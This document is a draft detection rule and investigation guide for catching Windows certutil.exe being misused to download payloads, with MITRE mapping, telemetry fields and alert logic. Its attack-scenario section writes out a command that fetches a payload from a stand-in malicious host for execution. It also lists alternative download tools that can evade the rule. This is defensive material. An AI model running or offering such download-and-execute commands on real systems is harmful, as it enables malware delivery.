# DET-007 - Certutil Remote Download

## Detection ID

DET-007

## Status

Draft

## Version

1.0

## Confidence

High

## Severity

High

---

# Threat Overview

Certutil.exe is a legitimate Microsoft utility used for certificate management. Because it is signed by Microsoft and commonly available on Windows systems, attackers frequently abuse it as a Living-off-the-Land Binary (LOLBin) to retrieve payloads from remote servers.

Monitoring certutil download activity provides visibility into payload staging and malware delivery without relying solely on PowerShell detections.

---

# MITRE ATT&CK Mapping

| Tactic | Technique |
|---------|-----------|
| Command and Control | T1105 – Ingress Tool Transfer |
| Defense Evasion | T1218 – System Binary Proxy Execution |

---

# Attack Scenario

An attacker executes:

certutil.exe -urlcache -split -f http://malicious-site/payload.exe payload.exe

The downloaded payload is then executed to continue the intrusion.

---

# Required Telemetry

| Source | Event |
|---------|-------|
| Sysmon | Event ID 1 |
| Windows Security | Event ID 4688 |

Important fields:

- Image
- CommandLine
- ParentImage
- User
- ProcessGuid

---

# Detection Logic

Generate an alert when certutil.exe is used with download-related flags while accessing a remote HTTP or HTTPS resource.

Indicators include:

- certutil.exe
- -urlcache
- -split
- -f
- http://
- https://

---

# False Positives

Potential legitimate activity includes:

- PKI administration
- Certificate management
- Enterprise certificate deployment

---

# Bypass Opportunities

Attackers may evade this detection by:

- Using curl.exe
- Using bitsadmin.exe
- Using PowerShell
- Using mshta.exe
- Downloading through custom malware

---

# Investigation Guide

When this detection triggers:

1. Review the complete command line.
2. Identify the downloaded URL.
3. Verify domain reputation.
4. Determine where the payload was saved.
5. Review the parent process.
6. Determine whether the downloaded file was executed.
7. Correlate with additional detections.

---

# Related Detections

- DET-002 – PowerShell Remote Content Retrieval
- DET-005 – Suspicious Parent Process
- DET-006 – PowerShell Network Communication

---

# Future Improvements

- Threat intelligence enrichment
- File hash correlation
- Parent process scoring
- Download reputation analysis
- Multi-stage attack correlation